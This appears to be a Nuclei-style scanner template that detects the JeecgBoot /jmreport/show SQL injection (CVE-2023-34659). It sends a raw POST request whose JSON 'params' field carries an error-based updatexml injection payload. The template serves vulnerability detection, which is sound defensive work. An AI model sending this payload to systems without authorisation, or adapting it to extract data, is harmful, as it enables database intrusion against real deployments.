id: poc-yaml-jeecgboot-show-sql-injection
info:
  name: JeecgBoot /jmreport/show SQL Injection Vulnerability (CVE-2023-34659)
  author: ProjectDiscoveryAI
  severity: high
  tags: cve-2023-34659,sql-injection
  description: |
    This template detects a SQL Injection vulnerability in the `/jmreport/show` endpoint of JeecgBoot (CVE-2023-34659).
variables:
  t1: "{{rand_int(1,100)}}"
  t2: "{{md5(t1)}}"
http:
  - raw:
      - |
        POST /jeecg-boot/jmreport/show HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json;charset=UTF-8

        {"id":"961455b47c0b86dc961e90b5893bff05","apiUrl":"","params":"{\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,({{t2}})),1)) or '%%' like '\"}"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "XPATH syntax error:"
          - "{{t2}}"
        condition: and
      - type: word
        words:
          - "<"
        negative: true
        condition: and
